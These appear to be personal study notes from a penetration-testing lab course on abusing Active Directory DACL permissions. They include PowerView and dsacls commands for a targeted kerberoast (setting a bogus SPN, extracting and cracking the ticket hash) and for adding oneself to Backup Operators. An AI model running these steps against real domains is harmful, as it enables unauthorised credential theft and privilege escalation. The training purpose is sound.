windows in particular uses discretionary access control lists (DACLs) 
  this means that access is granted based on the user's identity 
access control entries (ACEs) detail the access rights over specific objects 
  e.g. Full Control, Change Password, etc.

dsacls.exe can display and change ACEs / permissions in DACLs
    ex call listing DACLs of user yolanda
      dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local"
    ex call limiting results to show the permissions pedro has over yolando
      dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro"
    ex call to specify what we have permissions on
      dsacls.exe "cn=Rita,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 0,1

abuse DACLs  
  GenericAll - full control
  GenericWrite - full write permissions
  WriteDacl - allows for modification of the object's DACL
  WriteOwner - allows us to take ownership of the object

enumeration!
  PS> Get-DomainObjectAcl
  PS> Add-DomainObjectAcl
  PS> Get-Acl
  PS> Set-Acl
  on linux, we can use impacket's dacledit.py

we can kerberoast when we have GenericAll, GenericWrite, WriteProperty, WriteSPN or Validated-SPN over the target
  checking our rights over a target using powerview
    PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
    PS C:\Tools> Import-Module .\PowerView.ps1
    PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
    PS C:\Tools> Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
  setting the SPN
    PS C:\Tools> Get-DomainUser Rita | Select serviceprincipalname
    PS C:\Tools> Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
  getting the hash
    PS C:\Tools> $User = Get-DomainUser Rita
    PS C:\Tools> $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
  clearing the SPN
    PS C:\Tools> Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
  crack the hash
    kristab@htb[/htb]$ hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force
NOTE: for linux we can use https://github.com/ShutdownRepo/targetedKerberoast

we can add members to a group when we have GenericAll, GenericWrite, Self, AllExtendedRights, or Self-Membership over the target group
  checking our rights 
    PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
    PS C:\Tools> Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
      NOTE: if we see Self-Membership, that means we can add only ourselves to the group using PowerView or other LDAP protocols
  query the groups members
    C:\Tools> net localgroup "Backup Operators"
    OR C:\Tools> net group "Backup Operators" /domain, if from a domain-joined machine
  add ourselves via powerview
    PS C:\Tools> Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
      NOTE: once we add ourselves, we must reauthenticate 
  now we can read from the TestGroup share
    PS C:\Tools> net use K: \\DC01\TestGroup
    PS C:\Tools> ls K:\flag.txt

